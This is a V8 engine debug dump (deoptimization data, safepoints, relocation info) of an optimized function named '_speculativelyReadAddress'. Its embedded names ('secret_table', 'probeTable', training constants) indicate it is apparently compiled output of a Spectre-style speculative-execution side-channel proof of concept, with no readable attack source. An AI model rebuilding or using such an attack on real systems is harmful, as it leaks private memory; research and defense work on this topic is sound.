                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=19 (bool)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               INT32_STACK_SLOT {input=21}
                               STACK_SLOT {input=20}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=22}
    74               48   fbf  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=48, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               INT32_STACK_SLOT {input=19}
                               STACK_SLOT {input=20}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=21}
    75               27   fed  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=27, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=4 (0x2aec586127e9 <JSFunction Uint8Array (sfi = 0x247b86a94b01)>)}
                               STACK_SLOT {input=20}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=21}
    76               21  1014  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=21, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=4 (0x2aec586127e9 <JSFunction Uint8Array (sfi = 0x247b86a94b01)>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=20}
    77                6  103b  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=6, function=0x39d88e2581d1 <String[25]: _speculativelyReadAddress>, height=12}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x3f3b16e02f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=19}

Safepoints (size = 332)
0x172490876aa6     106  10bf  00000000001100000000000000000 (sp -> fp)       5
0x172490876cb7     317  10ec  00000000101100000000000000000 (sp -> fp)      14
0x1724908770aa     70a  1164  00000000101100000000000000000 (sp -> fp)      38
0x1724908772c0     920  11b9  00000000011100000000000000000 (sp -> fp)      55
0x172490877323     983  11c3  00000000111100000000000000000 (sp -> fp)      57
0x1724908773f0     a50  11d7  00000000111100000000000000000 (sp -> fp)      61
0x1724908775a0     c00  11f0  00000010111100000000000000000 (sp -> fp)      66
0x17249087774e     dae  11f5  00010100101100000000000000000 (sp -> fp)      67
0x1724908777b1     e11  11fa  00010100101100000000000000000 (sp -> fp)      68
0x172490877816     e76  11ff  00010100101100000000000000000 (sp -> fp)      69
0x17249087785e     ebe  1204  00001000101100000000000000000 (sp -> fp)      70
0x1724908778ae     f0e  1209  00001000101100000000000000000 (sp -> fp)      71
0x1724908778f1     f51  120e  00000100101100000000000000000 (sp -> fp)      72
0x17249087792f     f8f  1213  00000010101100000000000000000 (sp -> fp)      73
0x17249087795f     fbf  1218  00000001101100000000000000000 (sp -> fp)      74
0x17249087798d     fed  121d  00000001101100000000000000000 (sp -> fp)      75
0x1724908779b4    1014  1222  00000000101100000000000000000 (sp -> fp)      76
0x1724908779db    103b  1227  00000000011100000000000000000 (sp -> fp)      77

RelocInfo (size = 4519)
0x1724908769a0  comment  (-- <not inlined:333> --)
0x1724908769a0  comment  (-- Prologue: check for deoptimization --)
0x1724908769aa  code target (BUILTIN CompileLazyDeoptimizedCode)  (0x17249078ef20)
0x1724908769ae  comment  (-- B0 start (construct frame) --)
0x1724908769bf  code target (BUILTIN Abort)  (0x17249079d880)
0x1724908769c4  comment  (-- OSR entrypoint --)
0x1724908769e0  comment  (-- B1 start (loop up to 110) --)
0x1724908769e0  comment  (-- <not inlined:748> --)
0x1724908769e4  comment  (-- <not inlined:750> --)
0x1724908769f3  comment  (-- B2 start (in loop 1) --)
0x1724908769f3  comment  (-- <not inlined:748> --)
0x172490876a15  comment  (-- B3 start (in loop 1) --)
0x172490876a15  comment  (-- <not inlined:730> --)
0x172490876a22  comment  (-- B5 start (in loop 1) --)
0x172490876a22  comment  (-- B6 start (in loop 1) --)
0x172490876a22  comment  (-- <not inlined:821> --)
0x172490876a26  comment  (-- <not inlined:836> --)
0x172490876a30  comment  (-- B7 start (in loop 1) --)
0x172490876a34  comment  (-- <not inlined:866> --)
0x172490876a3e  comment  (-- B8 start (in loop 1) --)
0x172490876a3e  comment  (-- <not inlined:864> --)
0x172490876a77  comment  (-- B9 start (in loop 1) --)
0x172490876a77  comment  (-- B11 start (in loop 1) --)
0x172490876a77  comment  (-- <not inlined:821> --)
0x172490876a86  embedded object  (0x2aec586127e9 <JSFunction Uint8Array (sfi = 0x247b86a94b01)>)
0x172490876aa2  code target (BUILTIN CreateTypedArray)  (0x1724907cb960)
0x172490876aa6  comment  (-- <not inlined:904> --)
0x172490876aae  comment  (-- <not inlined:906> --)
0x172490876abf  comment  (-- B12 start (in loop 1) --)
0x172490876abf  comment  (-- <not inlined:904> --)
0x172490876ad2  comment  (-- B13 start (in loop 1) --)
0x172490876ad2  comment  (-- B14 start (in loop 1) --)
0x172490876ad2  comment  (-- <not inlined:886> --)
0x172490876adf  comment  (-- B16 start (in loop 1) --)
0x172490876adf  comment  (-- B17 start (in loop 1) --)
0x172490876adf  comment  (-- <not inlined:987> --)
0x172490876aef  comment  (-- B18 start (in loop 1) --)
0x172490876af2  comment  (-- B20 start (in loop 1) --)
0x172490876afd  comment  (-- B21 start (in loop 1) --)
0x172490876b0b  comment  (-- B22 start (in loop 1) --)
0x172490876b11  comment  (-- B23 start (in loop 1) --)
0x172490876b23  comment  (-- <not inlined:1051> --)
0x172490876b3f  comment  (-- B24 start (in loop 1) --)
0x172490876b3f  comment  (-- <not inlined:1059> --)
0x172490876b48  comment  (-- B25 start (in loop 1) --)
0x172490876b71  comment  (-- B26 start (in loop 1) --)
0x172490876b75  comment  (-- B27 start (in loop 1) --)
0x172490876b75  comment  (-- <not inlined:1061> --)
0x172490876b7a  comment  (-- <not inlined:1059> --)
0x172490876b7c  comment  (-- <not inlined:1114> --)
0x172490876b91  comment  (-- B28 start (in loop 1) --)
0x172490876b91  comment  (-- <not inlined:1124> --)
0x172490876ba6  comment  (-- B29 start (in loop 1) --)
0x172490876bb4  comment  (-- B30 start (in loop 1) --)
0x172490876bc1  comment  (-- B31 start (in loop 1) --)
0x172490876bc1  comment  (-- B32 start (in loop 1) --)
0x172490876bcb  comment  (-- B33 start (in loop 1) --)
0x172490876bdb  comment  (-- B34 start (in loop 1) --)
0x172490876beb  comment  (-- <not inlined:1209> --)
0x172490876c01  comment  (-- B35 start (in loop 1) --)
0x172490876c01  comment  (-- <not inlined:1246> --)
0x172490876c13  comment  (-- <not inlined:1232> --)
0x172490876c19  comment  (-- <not inlined:1246> --)
0x172490876c30  comment  (-- <not inlined:1214> --)
0x172490876c38  comment  (-- <not inlined:1334> --)
0x172490876c3c  comment  (-- <not inlined:1354> --)
0x172490876c46  comment  (-- B36 start (in loop 1) --)
0x172490876c46  comment  (-- <not inlined:1352> --)
0x172490876c5c  comment  (-- <not inlined:1368> --)
0x172490876c66  comment  (-- <not inlined:1124> --)
0x172490876c6a  comment  (-- <not inlined:1368> --)
0x172490876c88  comment  (-- B37 start (in loop 1) --)
0x172490876c88  comment  (-- B39 start (in loop 1) --)
0x172490876c88  comment  (-- <not inlined:1334> --)
0x172490876c94  embedded object  (0x2aec586127e9 <JSFunction Uint8Array (sfi = 0x247b86a94b01)>)
0x172490876cb3  code target (BUILTIN CreateTypedArray)  (0x1724907cb960)
0x172490876cb7  comment  (-- <not inlined:1490> --)
0x172490876cbf  comment  (-- <not inlined:1528> --)
0x172490876cc9  comment  (-- B40 start (in loop 1) --)
0x172490876cc9  comment  (-- <not inlined:1526> --)
0x172490876cd2  comment  (-- <not inlined:1523> --)
0x172490876cdb  embedded object  (0x060925484781 <Map(UINT8_ELEMENTS)>)
0x172490876d14  comment  (-- B41 start (in loop 1) --)
0x172490876d14  comment  (-- B42 start (in loop 1) --)
0x172490876d14  comment  (-- <not inlined:1543> --)
0x172490876d21  comment  (-- B43 start (in loop 1) --)
0x172490876d21  comment  (-- B44 start (in loop 1) --)
0x172490876d21  comment  (-- <not inlined:1598> --)
0x172490876d2f  comment  (-- B45 start (in loop 1) --)
0x172490876d2f  comment  (-- <not inlined:1610> --)
0x172490876d68  comment  (-- <not inlined:1781> --)
0x172490876d76  comment  (-- B46 start (in loop 1) --)
0x172490876d76  comment  (-- <not inlined:1820> --)
0x172490876da3  comment  (-- B47 start (in loop 1) --)
0x172490876da3  comment  (-- B49 start (in loop 1) --)
0x172490876da3  comment  (-- <not inlined:1804> --)
0x172490876da7  comment  (-- <not inlined:1820> --)
0x172490876db1  comment  (-- <not inlined:1800> --)
0x172490876dee  comment  (-- <not inlined:1786> --)
0x172490876df6  comment  (-- B50 start (in loop 1) --)
0x172490876df6  comment  (-- <not inlined:1891> --)
0x172490876e03  comment  (-- B51 start (in loop 1) --)
0x172490876e07  comment  (-- <not inlined:1918> --)
0x172490876e11  comment  (-- B52 start (in loop 1) --)
0x172490876e1c  comment  (-- <not inlined:1936> --)
0x172490876e36  comment  (-- <not inlined:1915> --)
0x172490876e3f  comment  (-- B53 start (in loop 1) --)
0x172490876e3f  comment  (-- B54 start (in loop 1) --)
0x172490876e3f  comment  (-- <not inlined:2045> --)
0x172490876e41  embedded object  (0x2d62aad35af9 <JSFunction probeTable (sfi = 0x39d88e2585a9)>)
0x172490876e53  comment  (-- B55 start (in loop 1) --)
0x172490876e53  comment  (-- B56 start (in loop 1) --)
0x172490876e60  comment  (-- B57 start (loop up to 108) (in loop 1) --)
0x172490876e60  comment  (-- <not inlined:904> --)
0x172490876e64  comment  (-- <not inlined:906> --)
0x172490876e75  comment  (-- B58 start (in loop 57) --)
0x172490876e75  comment  (-- <not inlined:904> --)
0x172490876e95  comment  (-- B59 start (in loop 57) --)
0x172490876e95  comment  (-- <not inlined:886> --)
0x172490876ea2  comment  (-- B61 start (in loop 57) --)
0x172490876ea2  comment  (-- B62 start (in loop 57) --)
0x172490876ea2  comment  (-- <not inlined:982> --)
0x172490876eae  comment  (-- <not inlined:987> --)
0x172490876eb7  comment  (-- B63 start (in loop 57) --)
0x172490876eb7  comment  (-- B65 start (in loop 57) --)
0x172490876ebe  comment  (-- <not inlined:982> --)
0x172490876ec1  comment  (-- <not inlined:987> --)
0x172490876edb  comment  (-- B66 start (in loop 57) --)
0x172490876ee4  comment  (-- B67 start (in loop 57) --)
0x172490876ef1  comment  (-- B68 start (in loop 57) --)
0x172490876ef6  comment  (-- B69 start (in loop 57) --)
0x172490876ef6  comment  (-- B74 start (in loop 57) --)
0x172490876f08  comment  (-- <not inlined:1051> --)
0x172490876f24  comment  (-- B75 start (in loop 57) --)
0x172490876f24  comment  (-- <not inlined:1059> --)
0x172490876f2e  comment  (-- B76 start (in loop 57) --)
0x172490876f59  comment  (-- B77 start (in loop 57) --)
0x172490876f5d  comment  (-- B78 start (in loop 57) --)
0x172490876f5d  comment  (-- <not inlined:1061> --)
0x172490876f63  comment  (-- <not inlined:1059> --)
0x172490876f66  comment  (-- <not inlined:1114> --)
0x172490876f82  comment  (-- B79 start (in loop 57) --)
0x172490876f82  comment  (-- <not inlined:1124> --)
0x172490876f98  comment  (-- B80 start (in loop 57) --)
0x172490876fa6  comment  (-- B81 start (in loop 57) --)
0x172490876fb3  comment  (-- B82 start (in loop 57) --)
0x172490876fb3  comment  (-- B83 start (in loop 57) --)
0x172490876fbe  comment  (-- B84 start (in loop 57) --)
0x172490876fce  comment  (-- B85 start (in loop 57) --)
0x172490876fde  comment  (-- <not inlined:1209> --)
0x172490876ff4  comment  (-- B86 start (in loop 57) --)
0x172490876ff4  comment  (-- <not inlined:1246> --)
0x172490877005  comment  (-- <not inlined:1232> --)
0x17249087700b  comment  (-- <not inlined:1246> --)
0x172490877022  comment  (-- <not inlined:1214> --)
0x17249087702a  comment  (-- <not inlined:1334> --)
0x17249087702e  comment  (-- <not inlined:1354> --)
0x172490877038  comment  (-- B87 start (in loop 57) --)
0x172490877038  comment  (-- <not inlined:1352> --)
0x17249087704e  comment  (-- <not inlined:1368> --)
0x172490877058  comment  (-- <not inlined:1124> --)
0x172490877063  comment  (-- <not inlined:1368> --)
0x172490877081  comment  (-- B88 start (in loop 57) --)
0x172490877081  comment  (-- B90 start (in loop 57) --)
0x172490877081  comment  (-- <not inlined:1334> --)
0x17249087708d  embedded object  (0x2aec586127e9 <JSFunction Uint8Array (sfi = 0x247b86a94b01)>)
0x1724908770a6  code target (BUILTIN CreateTypedArray)  (0x1724907cb960)
0x1724908770aa  comment  (-- <not inlined:1490> --)
0x1724908770b2  comment  (-- <not inlined:1528> --)
0x1724908770bc  comment  (-- B91 start (in loop 57) --)
0x1724908770bc  comment  (-- <not inlined:1526> --)
0x1724908770d9  comment  (-- <not inlined:1523> --)
0x1724908770e2  embedded object  (0x060925484781 <Map(UINT8_ELEMENTS)>)
0x17249087711b  comment  (-- B92 start (in loop 57) --)
0x17249087711b  comment  (-- B93 start (in loop 57) --)
0x17249087711b  comment  (-- <not inlined:1543> --)
0x172490877128  comment  (-- B94 start (in loop 57) --)
0x172490877128  comment  (-- B95 start (in loop 57) --)
0x172490877128  comment  (-- <not inlined:1598> --)
0x172490877136  comment  (-- B96 start (in loop 57) --)
0x172490877136  comment  (-- <not inlined:1610> --)
0x17249087716f  comment  (-- <not inlined:1781> --)
0x17249087717d  comment  (-- B97 start (in loop 57) --)
0x17249087717d  comment  (-- <not inlined:1820> --)
0x1724908771aa  comment  (-- B98 start (in loop 57) --)
0x1724908771aa  comment  (-- B100 start (in loop 57) --)
0x1724908771aa  comment  (-- <not inlined:1804> --)
0x1724908771ae  comment  (-- <not inlined:1820> --)
0x1724908771b8  comment  (-- <not inlined:1800> --)
0x1724908771f5  comment  (-- <not inlined:1786> --)
0x1724908771fd  comment  (-- B101 start (in loop 57) --)
0x1724908771fd  comment  (-- <not inlined:1891> --)
0x17249087720a  comment  (-- B102 start (in loop 57) --)
0x17249087720e  comment  (-- <not inlined:1918> --)
0x172490877218  comment  (-- B103 start (in loop 57) --)
0x172490877218  comment  (-- <not inlined:1936> --)
0x172490877231  comment  (-- <not inlined:771> --)
0x17249087723c  comment  (-- <not inlined:1915> --)
0x172490877245  comment  (-- B104 start (in loop 57) --)
0x172490877245  comment  (-- B105 start (in loop 57) --)
0x172490877245  comment  (-- <not inlined:2045> --)
0x172490877247  embedded object  (0x2d62aad35af9 <JSFunction probeTable (sfi = 0x39d88e2585a9)>)
0x172490877259  comment  (-- B106 start (in loop 57) --)
0x172490877259  comment  (-- B107 start (in loop 57) --)
0x172490877272  comment  (-- B108 start (in loop 1) --)
0x172490877272  comment  (-- B109 start (in loop 1) --)
0x17249087727d  comment  (-- <not inlined:771> --)
0x172490877286  comment  (-- <not inlined:748> --)
0x172490877299  comment  (-- B110 start (deconstruct frame) --)
0x172490877299  comment  (-- <not inlined:2100> --)
0x1724908772a4  comment  (-- B141 start (no frame) --)
0x1724908772a4  comment  (-- B4 start (deferred) (in loop 1) --)
0x1724908772a4  comment  (-- <not inlined:730> --)
0x1724908772bc  code target (BUILTIN CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)  (0x1724907cfb00)
0x1724908772dc  comment  (-- B10 start (deferred) (in loop 1) --)
0x1724908772dc  comment  (-- <not inlined:864> --)
0x17249087730a  comment  (-- B15 start (deferred) (in loop 1) --)
0x17249087730a  comment  (-- <not inlined:886> --)
0x17249087731f  code target (BUILTIN CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)  (0x1724907cfb00)
0x172490877333  comment  (-- B19 start (deferred) (in loop 1) --)
0x172490877333  comment  (-- <not inlined:987> --)
0x17249087735b  comment  (-- B38 start (deferred) (in loop 1) --)
0x17249087735b  comment  (-- <not inlined:1368> --)
0x17249087737d  comment  (-- B48 start (deferred) (in loop 1) --)
0x17249087737d  comment  (-- <not inlined:1820> --)
0x1724908773c3  embedded object  (0x060925484781 <Map(UINT8_ELEMENTS)>)
0x1724908773d7  comment  (-- B60 start (deferred) (in loop 57) --)
0x1724908773d7  comment  (-- <not inlined:886> --)
0x1724908773ec  code target (BUILTIN CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)  (0x1724907cfb00)
0x172490877412  embedded object  (0x060925484781 <Map(UINT8_ELEMENTS)>)
0x17249087741f  comment  (-- B64 start (deferred) (in loop 57) --)
0x17249087741f  comment  (-- <not inlined:987> --)
0x172490877457  embedded object  (0x060925484781 <Map(UINT8_ELEMENTS)>)
0x172490877464  comment  (-- B70 start (deferred) (in loop 57) --)
0x172490877479  comment  (-- B71 start (deferred) (in loop 57) --)
0x172490877486  comment  (-- B72 start (deferred) (in loop 57) --)
0x17249087748b  comment  (-- B73 start (deferred) (in loop 57) --)
0x1724908774b4  embedded object  (0x060925484781 <Map(UINT8_ELEMENTS)>)
0x1724908774c4  comment  (-- B89 start (deferred) (in loop 57) --)
0x1724908774c4  comment  (-- <not inlined:1368> --)
0x1724908774ec  embedded object  (0x060925484781 <Map(UINT8_ELEMENTS)>)
0x172490877500  comment  (-- B99 start (deferred) (in loop 57) --)
0x172490877500  comment  (-- <not inlined:1820> --)
0x172490877546  embedded object  (0x060925484781 <Map(UINT8_ELEMENTS)>)
0x17249087755a  comment  (-- B111 start (deferred) --)
0x17249087756f  comment  (-- B112 start (deferred) --)
0x172490877576  comment  (-- B113 start (deferred) --)
0x17249087757f  embedded object  (0x39d88e2580f1 <String[17]: TRAINING_CONSTANT>)
0x172490877588  comment  (-- <not inlined:1918> --)
0x17249087759c  code target (BUILTIN CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)  (0x1724907cfb00)
0x1724908775a0  comment  (-- B114 start (deferred) --)
0x1724908775d1  comment  (-- B115 start (deferred) --)
0x172490877610  comment  (-- B116 start (deferred) --)
0x172490877656  comment  (-- B117 start (deferred) --)
0x172490877670  comment  (-- B118 start (deferred) --)
0x1724908776a1  comment  (-- B119 start (deferred) --)
0x1724908776be  comment  (-- B120 start (deferred) --)
0x1724908776d8  comment  (-- B121 start (deferred) --)
0x1724908776f7  comment  (-- B122 start (deferred) --)
0x172490877719  comment  (-- B123 start (deferred) --)
0x172490877722  embedded object  (0x39d88e2580a1 <String[4]: junk>)
0x17249087772b  comment  (-- <not inlined:1781> --)
0x17249087774a  code target (BUILTIN CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)  (0x1724907cfb00)
0x17249087774e  comment  (-- B124 start (deferred) --)
0x172490877783  comment  (-- B125 start (deferred) --)
0x17249087778c  embedded object  (0x39d88e2581a9 <String[12]: secret_table>)
0x172490877795  comment  (-- <not inlined:1598> --)
0x1724908777ad  code target (BUILTIN CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)  (0x1724907cfb00)
0x1724908777b1  comment  (-- B126 start (deferred) --)
0x1724908777ef  comment  (-- B127 start (deferred) --)
0x1724908777f8  embedded object  (0x39d88e258121 <String[9]: page_size>)
0x172490877801  comment  (-- <not inlined:1528> --)
0x172490877812  code target (BUILTIN CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)  (0x1724907cfb00)
0x172490877816  comment  (-- B128 start (deferred) --)
0x172490877828  comment  (-- B129 start (deferred) --)
0x17249087782a  embedded object  (0x39d88e258149 <String[12]: probe_length>)
0x172490877833  comment  (-- <not inlined:1354> --)
0x17249087785a  code target (BUILTIN CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)  (0x1724907cfb00)
0x17249087785e  comment  (-- B130 start (deferred) --)
0x172490877887  comment  (-- B131 start (deferred) --)
0x172490877889  embedded object  (0x39d88e2580a1 <String[4]: junk>)
0x172490877892  comment  (-- <not inlined:1209> --)
0x1724908778aa  code target (BUILTIN CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)  (0x1724907cfb00)
0x1724908778ae  comment  (-- B132 start (deferred) --)
0x1724908778ca  comment  (-- B133 start (deferred) --)
0x1724908778cc  embedded object  (0x39d88e258121 <String[9]: page_size>)
0x1724908778d5  comment  (-- <not inlined:1114> --)
0x1724908778ed  code target (BUILTIN CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)  (0x1724907cfb00)
0x1724908778f1  comment  (-- B134 start (deferred) --)
0x17249087790f  comment  (-- B135 start (deferred) --)
0x172490877911  embedded object  (0x2aec58602541 <String[7]: address>)
0x17249087791a  comment  (-- <not inlined:1051> --)
0x17249087792b  code target (BUILTIN CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)  (0x1724907cfb00)
0x17249087792f  comment  (-- B136 start (deferred) --)
0x17249087793f  comment  (-- B137 start (deferred) --)
0x172490877941  embedded object  (0x39d88e258171 <String[27]: speculative_training_number>)
0x17249087794a  comment  (-- <not inlined:906> --)
0x17249087795b  code target (BUILTIN CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)  (0x1724907cfb00)
0x17249087795f  comment  (-- B138 start (deferred) --)
0x172490877961  embedded object  (0x39d88e258121 <String[9]: page_size>)
0x17249087796a  comment  (-- <not inlined:866> --)
0x172490877989  code target (BUILTIN CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)  (0x1724907cfb00)
0x17249087798d  comment  (-- B139 start (deferred) --)
0x17249087798f  embedded object  (0x39d88e258171 <String[27]: speculative_training_number>)
0x172490877998  comment  (-- <not inlined:836> --)
0x1724908779b0  code target (BUILTIN CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)  (0x1724907cfb00)
0x1724908779b4  comment  (-- B140 start (deferred) --)
0x1724908779b6  embedded object  (0x39d88e2580f1 <String[17]: TRAINING_CONSTANT>)
0x1724908779bf  comment  (-- <not inlined:750> --)
0x1724908779d7  code target (BUILTIN CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)  (0x1724907cfb00)
0x1724908779db  comment  (-- Out of line code --)
0x1724908779e5  code target (BUILTIN DoubleToI)  (0x1724907d2fa0)
0x1724908779ff  code target (BUILTIN DoubleToI)  (0x1724907d2fa0)
0x172490877a1a  code target (BUILTIN DoubleToI)  (0x1724907d2fa0)
0x172490877a35  code target (BUILTIN DoubleToI)  (0x1724907d2fa0)
0x172490877a46  deopt script offset  (748)
0x172490877a46  deopt inlining id  (-1)
0x172490877a46  deopt reason  (not a Smi)
0x172490877a46  deopt index
0x172490877a47  runtime entry  (eager deoptimization bailout 0)
0x172490877a4b  deopt script offset  (748)
0x172490877a4b  deopt inlining id  (-1)
0x172490877a4b  deopt reason  (not a Smi)
0x172490877a4b  deopt index
0x172490877a4c  runtime entry  (eager deoptimization bailout 1)
0x172490877a50  deopt script offset  (864)
0x172490877a50  deopt inlining id  (-1)
0x172490877a50  deopt reason  (not a Smi)
0x172490877a50  deopt index
0x172490877a51  runtime entry  (eager deoptimization bailout 2)
0x172490877a55  deopt script offset  (864)
0x172490877a55  deopt inlining id  (-1)
0x172490877a55  deopt reason  (not a Smi)
0x172490877a55  deopt index
0x172490877a56  runtime entry  (eager deoptimization bailout 3)
0x172490877a5a  deopt script offset  (864)
0x172490877a5a  deopt inlining id  (-1)
0x172490877a5a  deopt reason  (overflow)
0x172490877a5a  deopt index
0x172490877a5b  runtime entry  (eager deoptimization bailout 4)
0x172490877a5f  deopt script offset  (821)
0x172490877a5f  deopt inlining id  (-1)
0x172490877a5f  deopt reason  ((unknown))
0x172490877a5f  deopt index
0x172490877a60  runtime entry  (lazy deoptimization bailout 5)
0x172490877a64  deopt script offset  (904)
0x172490877a64  deopt inlining id  (-1)
0x172490877a64  deopt reason  (not a Smi)
0x172490877a64  deopt index
0x172490877a65  runtime entry  (eager deoptimization bailout 6)
0x172490877a69  deopt script offset  (1059)
0x172490877a69  deopt inlining id  (-1)
0x172490877a69  deopt reason  (not a heap number)
0x172490877a69  deopt index
0x172490877a6a  runtime entry  (eager deoptimization bailout 7)
0x172490877a6e  deopt script offset  (1124)
0x172490877a6e  deopt inlining id  (-1)
0x172490877a6e  deopt reason  (not a Number or Oddball)
0x172490877a6e  deopt index
0x172490877a6f  runtime entry  (eager deoptimization bailout 8)
0x172490877a73  deopt script offset  (1246)
0x172490877a73  deopt inlining id  (-1)
0x172490877a73  deopt reason  (not a Smi)
0x172490877a73  deopt index
0x172490877a74  runtime entry  (eager deoptimization bailout 9)
0x172490877a78  deopt script offset  (1352)
0x172490877a78  deopt inlining id  (-1)
0x172490877a78  deopt reason  (not a Smi)
0x172490877a78  deopt index
0x172490877a79  runtime entry  (eager deoptimization bailout 10)
0x172490877a7d  deopt script offset  (1352)
0x172490877a7d  deopt inlining id  (-1)
0x172490877a7d  deopt reason  (overflow)
0x172490877a7d  deopt index
0x172490877a7e  runtime entry  (eager deoptimization bailout 11)
0x172490877a82  deopt script offset  (1368)
0x172490877a82  deopt inlining id  (-1)
0x172490877a82  deopt reason  (not a Smi)
0x172490877a82  deopt index
0x172490877a83  runtime entry  (eager deoptimization bailout 12)
0x172490877a87  deopt script offset  (1368)
0x172490877a87  deopt inlining id  (-1)
0x172490877a87  deopt reason  (overflow)
0x172490877a87  deopt index
0x172490877a88  runtime entry  (eager deoptimization bailout 13)
0x172490877a8c  deopt script offset  (1334)
0x172490877a8c  deopt inlining id  (-1)
0x172490877a8c  deopt reason  ((unknown))
0x172490877a8c  deopt index
0x172490877a8d  runtime entry  (lazy deoptimization bailout 14)
0x172490877a91  deopt script offset  (1526)
0x172490877a91  deopt inlining id  (-1)
0x172490877a91  deopt reason  (not a Smi)
0x172490877a91  deopt index
0x172490877a92  runtime entry  (eager deoptimization bailout 15)
